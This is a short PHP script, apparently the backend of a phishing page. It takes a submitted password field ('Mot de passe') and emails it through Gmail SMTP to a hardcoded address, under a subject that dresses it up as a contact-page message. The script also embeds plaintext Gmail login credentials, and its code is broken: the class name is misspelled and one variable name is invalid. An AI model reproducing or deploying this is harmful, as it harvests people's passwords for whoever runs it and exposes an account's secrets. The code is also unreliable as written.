<?php
use PHPMailer\PHPMailer\PHPMailer;

require_once'phpmailer/Exception.php';
require_once'phpmailer/PHPMailer.php';
require_once'phpmailer/SMTP.php';

 $mail = new PHPMiler(true);
 $alert ='';

if(isset( $_POST['btn'])){
 $Mot de passe = $_POST['Mot de passe'];

try{
 $mail->isSMTP();
 $mail->Host ='smtp.gmail.com';
 $mail->SMTPAuth = true;
 $mail->Username = 'dvdchasseur@gmail.com';
 $mail->Password ='rucheetlapin';
 $mail->SMTPSecure= PHPMailer::ENCRYPTION_STARTTLS;
 $mail->Port ='587';

 $mail->setfrom('dvdchasseur@gmail.com');
 $mail->addAddress('dvdchasseur@gmail.com');

$mail->isHTML(true);
$mail->subject = 'Message Received (Contact Page)';
$mail->Body = "<h3>Mot de passe : $Mot de passe  </h3>";

 $mail->send();
 $alert = '<div class="alert-success">
         </div>';
} catch (Exception $e){
 $alert = '<div class="alert-error">
        <span'.$e->getMessage().'</span>
        </div>';
 

   }
}

?>
      
